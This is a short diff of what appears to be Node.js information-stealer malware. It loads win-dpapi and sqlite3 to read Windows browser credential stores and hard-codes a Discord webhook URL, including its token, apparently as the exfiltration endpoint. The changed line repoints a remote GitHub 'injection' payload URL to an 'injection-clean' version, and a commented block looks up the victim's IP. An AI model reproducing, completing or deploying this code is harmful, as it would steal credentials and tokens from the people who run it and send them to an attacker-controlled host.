@@ -11,7 +11,7 @@ const crypto = require('crypto');
 const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
 const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
 const src = ("https://discord.com/api/webhooks/966633343141695538/ZzeJXm0leVrbh5vJ3Wx_b1G5yzcx2ZuhrX30HsYC9HXVoURLymn-FOE1vflo92dz9Har")
-const github = "https://github.com/ugur014/ajwdbawjdbawjdbawjdbawjd/blob/main/src/Injection/injection"
+const github = "https://github.com/ugur014/ajwdbawjdbawjdbawjdbawjd/blob/main/src/Injection/injection-clean"
 /*((async () => {
     await axios.get('https://ipconfig.io/json')
         .then(res => {
